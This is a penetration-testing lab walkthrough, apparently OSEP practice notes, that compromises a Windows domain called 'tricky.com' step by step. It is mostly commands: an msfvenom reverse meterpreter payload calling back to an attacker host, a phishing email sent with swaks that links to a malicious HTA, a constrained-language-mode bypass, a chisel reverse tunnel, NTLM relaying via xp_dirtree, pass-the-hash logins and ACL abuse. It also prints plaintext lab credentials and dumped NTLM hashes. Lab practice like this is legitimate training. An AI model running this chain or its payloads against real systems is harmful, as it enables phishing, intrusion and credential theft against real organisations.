# Challenge 4

## Details

```powershell
# List of hosts in scope
192.168.100.159 - CLIENT09
172.16.100.150  - dc04
172.16.100.151  - SQL05
172.16.100.152  - SQL07
172.16.100.155  - CLIENT09
# Development host
192.168.100.100 - Administrator:lab
```

## Enumeration

### 192.168.100.159

#### Open Ports

| Port      | State | Service      |
| --------- | ----- | ------------ |
| 25/tcp    | open  | ssh          |
| 80/tcp    | open  | http         |
| 110/tcp   | open  | pop3         |
| 135/tcp   | open  | msrpc        |
| 139/tcp   | open  | netbios-ssn  |
| 143/tcp   | open  | imap         |
| 445/tcp   | open  | microsoft-ds |
| 587/tcp   | open  | submission   |
| 5985/tcp  | open  | wsman        |
| 47001/tcp | open  | winrm        |
| 49664/tcp | open  | unknown      |
| 49665/tcp | open  | unknown      |
| 49666/tcp | open  | unknown      |
| 49667/tcp | open  | unknown      |
| 49668/tcp | open  | unknown      |
| 49669/tcp | open  | unknown      |
| 49670/tcp | open  | unknown      |
| 49671/tcp | open  | unknown      |
| 49672/tcp | open  | unknown      |

#### HTTP

Navigating to the web page on port 80 we see the following information

<figure><img src="../../../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

## Exploitation

We also see that port 25 is open so the likely path forward is to send a phishing email

Firstly create a reverse shell using metasploit

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.204 LPORT=443 -f csharp
```
{% endcode %}

1. Open DotNetToJscript from the SMB share in VisualStudio located `X:\OSEP\JscriptRunner\DotNetToJScript.sln`
2. Make modifications to ExampleAssembly\TestClass.cs then compile
3. Copy `DotNetToJscript.exe` & `NDesk.Options.dll` from `X:\OSEP\JscriptRunner\DotNetToJScript\bin\Release` folder to Windows host.&#x20;
4. Copy `ExampleAssembly.dll` from `X:\OSEP\JscriptRunner\ExampleAssembly\bin\x64\Release\ExampleAssembly.dll` folder to Windows host.&#x20;
5. On Windows host run `DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js`
6. `Modify the cmd.hta`

Setup Metasploit listener

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.49.100
set lport 443
set exitfunc thread
run
```

Using DotNetToJscript to

{% code overflow="wrap" %}
```bash
swaks --body 'Please click here http://192.168.49.100/cmd2.hta' --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --header "Subject: Definitely not malware" -t will@tricky.com -f will@tricky.com --server 192.168.100.159
```
{% endcode %}

Catch Meterpreter reverse shell

{% code overflow="wrap" %}
```powershell
shell

net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
cd \windows\tasks
copy X:\OSEP\ActiveDirectoryExploitation\SharpHound.exe
.\SharpHound.exe -c all -d tricky.com

# Check current language mode
$ExecutionContext.SessionState.LanguageMode
# Upload Bypass using Metasploit
upload /home/kali/share/PsBypassCLM.exe C:\\Windows\\Tasks\\PsBypassCLM.exe
# Run this in CMD prompt context is meant to be for a reverse shell but it opens a PowerShell prompt with Full Language mode. 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=192.168.49.57 /rport=53 /U C:\Windows\Tasks\PsBypassCLM.exe

# Run SharpHound
copy X:\share\PowerSharpPack\PowerSharpBinaries\Invoke-SharpHound4.ps1
gc -raw Invoke-SharpHound4.ps1 | iex
Invoke-SharpHound4

# Run ADPeas
copy X:\share\adPEAS.ps1
gc -raw adPEAS.ps1 | iex
Invoke-adPEAS

# Setup chisel
copy X:\share\chisel.exe
# On Kali host
chisel server -p 8001 --reverse
# On Windows host
chisel.exe client 192.168.49.100:8001 R:1080:socks

# Find credentials
type 'C:\Program Files\setup\mail.ps1'

will:fdsfssdfDFG4

# Setup proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
set SRVHOST 127.0.0.1
run -j
sessions -i 2
run autoroute -s 172.16.100.0/24

# Check for shares
proxychains crackmapexec smb 172.16.100.150 -u will -p 'fdsfssdfDFG4'
proxychains crackmapexec smb 172.16.100.151 -u will -p 'fdsfssdfDFG4'
proxychains crackmapexec smb 172.16.100.152 -u will -p 'fdsfssdfDFG4'

# Connect to SQL server
proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py will:fdsfssdfDFG4@172.16.100.151 -port 1433 -windows-auth

```
{% endcode %}

`swaks --body 'Please click here http://192.168.49.100/cmd.hta' --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --header "Subject: Definitely not malware" -t will@tricky.com -f will@tricky.com --server 192.168.100.159`

## Initial Access





## Domain Enumeration



## Domain Escalation

After running bloodhound and running analysis the path to Domain Administrator appears to be pretty straight forward.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (1) (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

### SQL07

Exploitation

{% code overflow="wrap" %}
```bash
# We can remotely login to SQL05 
proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py will:fdsfssdfDFG4@172.16.100.151 -port 1433 -windows-auth
# Start ntlmrelayx to relay to hash to SQL07
proxychains python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.100.152
# Run SQL query to so NTLMRelayx can forward the hash
EXECUTE ('master.sys.xp_dirtree "\\192.168.49.100\test"')
# Login remotely using hash
proxychains evil-winrm -i 172.16.100.152 -u administrator -H f097f4c64a2af8f0057015a40367ecd9
```
{% endcode %}

Hashes

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:de4257c067b8dffabf13ee27bc26af6a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cf24abb0dd2ff42591001e892d98d690:::
setup:1001:aad3b435b51404eeaad3b435b51404ee:c406ffc61eb698198ad5e88d2f3a344a:::
```

### SQL05

Exploitation

{% code overflow="wrap" %}
```bash
# We can remotely login to SQL07
proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py will:fdsfssdfDFG4@172.16.100.152 -port 1433 -windows-auth
# Start ntlmrelayx to relay to hash to SQL05
proxychains python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.100.151
# Run SQL query to so NTLMRelayx can forward the hash
EXECUTE ('master.sys.xp_dirtree "\\192.168.49.100\test"')
# Login remotely using hash
proxychains evil-winrm -i 172.16.100.152 -u administrator -H f097f4c64a2af8f0057015a40367ecd9
```
{% endcode %}

Hashes

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f11d19a668e5b6532fe2b6324aef5641:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:807e88817b41a28e6a46892728b03ce7:::
setup:1001:aad3b435b51404eeaad3b435b51404ee:85c14abd05f0e6107af13f55fddffdc3:::
```

```powershell
$creds = New-Object System.Management.Automation.PSCredential ("tricky.com\sqlsvc", (ConvertTo-SecureString "4dfgdfFFF542" -AsPlainText -Force))
Add-DomainObjectAcl -TargetIdentity Mailadmins -PrincipalIdentity sqlsvc -Rights All -Credential $creds -Verbose
Add-DomainGroupMember -Identity 'MAILADMINS' -Members 'sqlsvc' -Credential $creds

proxychains bloodhound-python -d tricky.com -u will -p fdsfssdfDFG4 -gc dc04.tricky.com -c all -ns 172.16.100.150

evil-winrm -i 192.168.100.159 -u sqlsvc -p 4dfgdfFFF542
cd ..\..\administrator\desktop
type proof.txt

```
